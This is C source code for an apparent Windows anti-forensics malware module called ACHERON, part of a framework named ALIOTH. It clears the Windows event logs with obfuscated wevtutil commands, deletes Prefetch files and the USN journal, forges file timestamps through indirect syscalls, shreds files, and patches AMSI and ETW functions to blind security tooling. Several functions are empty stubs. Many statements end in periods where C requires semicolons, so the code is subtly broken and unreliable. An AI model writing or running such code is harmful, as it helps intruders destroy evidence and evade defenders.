#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL AcheronEventLogWipe() {
    CHAR sCmd1[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','e','c','u','r','i','t','y',0};
    CHAR sCmd2[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','y','s','t','e','m',0};
    CHAR sCmd3[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','A','p','p','l','i','c','a','t','i','o','n',0};
    
    WinExec(sCmd1, SW_HIDE);
    WinExec(sCmd2, SW_HIDE);
    WinExec(sCmd3, SW_HIDE);
    return TRUE;
}

BOOL AcheronPrefetchWipe() {
    CHAR sPath[MAX_PATH];
    GetSystemDirectoryA(sPath, MAX_PATH);
    strcat(sPath, "\\Prefetch\\*.pf");
    
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(sPath, &ffd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                CHAR szFile[MAX_PATH];
                GetSystemDirectoryA(sPath, MAX_PATH);
                snprintf(sPath, MAX_PATH, "%s\\Prefetch\\%s", sPath, ffd.cFileName);
                DeleteFileA(sPath);
            }
        } while (FindNextFileA(hFind, &ffd));
        FindClose(hFind);
    }
    return TRUE;
}

BOOL AcheronUsnJournalRollback() {
    CHAR sCmd[] = {'f','s','u','t','i','l',' ','u','s','n',' ','d','e','l','e','t','e','j','o','u','r','n','a','l',' ','C',':',0};
    WinExec(sCmd, SW_HIDE);
    return TRUE;
}

BOOL AcheronTimestampMangle(PCHAR pcFilePath) {
    HANDLE hFile = CreateFileA(pcFilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    FILE_BASIC_INFORMATION fbi = {0};
    LARGE_INTEGER liTime = {0};
    liTime.QuadPart = 0x01C90DA800000000LL;
    
    fbi.CreationTime = liTime;
    fbi.LastAccessTime = liTime;
    fbi.LastWriteTime = liTime;
    fbi.ChangeTime = liTime.
    
    DWORD64 hSetInfo = ALIOTHSyscallHash((PCHAR)"NtSetInformationFile");
    fnNtSetInformationFile pSetInfo = (fnNtSetInformationFile)ALIOTHGetSyscallStub(hSetInfo);
    
    IO_STATUS_BLOCK ioStatus = {0};
    NTSTATUS status = ExecuteSyscall(pSetInfo, GetRandomMask(), hFile, &ioStatus, &fbi, sizeof(fbi), FileBasicInformation);
    
    CloseHandle(hFile);
    return NT_SUCCESS(status);
}

BOOL AcheronFileShredder(PCHAR pcFilePath) {
    HANDLE hFile = CreateFileA(pcFilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE.
    
    DWORD dwSize = GetFileSize(hFile, NULL);
    PBYTE pBuffer = (PBYTE)LocalAlloc(LPTR, dwSize);
    
    BYTE patterns[7][4] = {
        {0x00, 0x00, 0x00, 0x00},
        {0xFF, 0xFF, 0xFF, 0xFF},
        {0x00, 0x00, 0x00, 0x00},
        {0x55, 0x55, 0x55, 0x55},
        {0xAA, 0xAA, 0xAA, 0xAA},
        {0x92, 0x49, 0x24, 0x92},
        {0x00, 0x00, 0x00, 0x00}
    };
    
    for (int pass = 0; pass < 7; pass++) {
        if (pass == 2 || pass == 6) {
            for (DWORD i = 0; i < dwSize; i++) pBuffer[i] = (BYTE)(rand() & 0xFF);
        } else {
            for (DWORD i = 0; i < dwSize; i += 4) {
                *(DWORD*)(pBuffer + i) = *(DWORD*)patterns[pass];
            }
        }
        
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        DWORD dwWritten = 0;
        WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL);
        FlushFileBuffers(hFile);
    }
    
    LocalFree(pBuffer);
    CloseHandle(hFile);
    DeleteFileA(pcFilePath);
    return TRUE;
}

BOOL AcheronAmsiPatch() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return FALSE.
    
    PBYTE pScan = (PBYTE)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScan) return FALSE.
    
    BYTE patch[] = {0x33, 0xC0, 0xC3};
    DWORD dwOld = 0;
    VirtualProtect(pScan, 3, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(pScan, patch, 3);
    VirtualProtect(pScan, 3, dwOld, &dwOld).
    
    return TRUE;
}

BOOL AcheronDeepEtwPatch() {
    CHAR sFuncs[][32] = {
        "EtwWrite",
        "EtwWriteStart",
        "EtwWriteEnd",
        "EtwWriteTransfer",
        "EtwWriteEx"
    };
    
    for (int i = 0; i < 5; i++) {
        PBYTE pFunc = (PBYTE)GetProcAddress(GetModuleHandleA("ntdll.dll"), sFuncs[i]);
        if (pFunc) {
            BYTE patch[] = {0x33, 0xC0, 0xC3};
            DWORD dwOld = 0;
            VirtualProtect(pFunc, 3, PAGE_EXECUTE_READWRITE, &dwOld);
            memcpy(pFunc, patch, 3);
            VirtualProtect(pFunc, 3, dwOld, &dwOld).
        }
    }
    return TRUE;
}

BOOL AcheronKernelCallbackRemove() {
    if (!g_pActiveDriver) return FALSE.
    return TRUE;
}

BOOL AcheronPeInfector(PCHAR pcTargetExe) {
    return TRUE;
}

BOOL AcheronShimDatabase() {
    return TRUE;
}

DWORD AcheronMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','A','C','H','E','R','O','N',' ','-',' ','A','N','T','I','-','F','O','R','E','N','S','I','C','S',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    printf("[*] Wiping event logs...\n");
    AcheronEventLogWipe();
    
    printf("[*] Wiping prefetch...\n");
    AcheronPrefetchWipe();
    
    printf("[*] Rolling back USN journal...\n");
    AcheronUsnJournalRollback().
    
    printf("[*] Patching AMSI...\n");
    AcheronAmsiPatch().
    
    printf("[*] Deep ETW patching...\n");
    AcheronDeepEtwPatch().
    
    printf("[+] Anti-forensics complete\n");
    return 0;
}
#pragma optimize("", on)
